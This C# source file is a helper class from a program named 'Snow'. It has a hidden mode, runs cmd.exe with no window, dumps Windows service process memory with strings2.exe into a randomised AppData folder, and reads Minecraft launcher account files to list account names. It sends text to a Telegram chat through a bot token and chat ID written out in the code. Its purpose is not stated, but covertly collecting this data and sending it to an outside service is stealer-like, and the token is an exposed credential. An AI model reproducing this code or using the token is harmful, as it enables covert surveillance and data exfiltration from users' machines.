using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using System;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Net;
using System.Text.RegularExpressions;
using Telegram.Bot;
namespace Snow
{
    class stringsHelper
    {
        public static string SnowDir = "Snow-" + new Random().Next(1000, 9999);
        public static string username = Environment.UserName;
        public static string resultString = "";
        public static string finalHwid = "";
        public static string reason = "";

        public static string Print(string content)
        {
            if (!randomsHelper.hidden)
            {
                Console.Write("[");
                Console.ForegroundColor = ConsoleColor.Green;
                Console.Write("+");
                Console.ForegroundColor = ConsoleColor.Gray;
                Console.Write("] ");
                Console.WriteLine(content);
            }
            return content;
        }
        public static string CMD(string process, string content)
        {
            Process cmd = new Process();
            cmd.StartInfo.FileName = process;
            cmd.StartInfo.RedirectStandardInput = true;
            cmd.StartInfo.RedirectStandardOutput = true;
            cmd.StartInfo.CreateNoWindow = true;
            cmd.StartInfo.UseShellExecute = false;
            cmd.Start();
            cmd.StandardInput.WriteLine(content);
            cmd.StandardInput.Flush();
            cmd.StandardInput.Close();
            cmd.WaitForExit();
            return content;
        }

        public static string sendTGMessage(string content)
        {
            TelegramBotClient Bot = new TelegramBotClient("5466742118:AAGlDKzrn3YljNH53NXlQhYvK_RHBIb7aw0");

            Bot.SendTextMessageAsync("5347986768", content);

            return content;
        }
        public static string Dump(string serviceName)
        {
            ManagementObject service = new ManagementObject(@"Win32_service.Name='" + serviceName + "'");
            object o = service.GetPropertyValue("ProcessId");
            int processId = (int)((UInt32)o);
            CMD("CMD.exe", $@"C: && cd C:\Users\{username}\AppData\Roaming\{SnowDir}\ && strings2.exe -pid {processId} > {serviceName}.txt");
            return serviceName;
        }

        public static int altsCounter = 0;
        public static string checkAlt(string path, string p)
        {
            try
            {
                string MCAccountFile = File.ReadAllText(path);
                JObject MCAccountFileObj = JsonConvert.DeserializeObject<JObject>(MCAccountFile);
                Regex getCorrectAccount = new Regex("\".*?\"");

                foreach (JToken profileUUID in MCAccountFileObj["accounts"])
                {
                    Match mhc = getCorrectAccount.Match(profileUUID.ToString());
                    if (mhc.Success)
                    {
                        Writer.writeLine("- " + MCAccountFileObj["accounts"][mhc.Value.Replace("\"", "")]["minecraftProfile"]["name"].ToString() + p);
                        altsCounter++;
                    }
                }
            }
            catch { }
            return p;
        }
    }
}
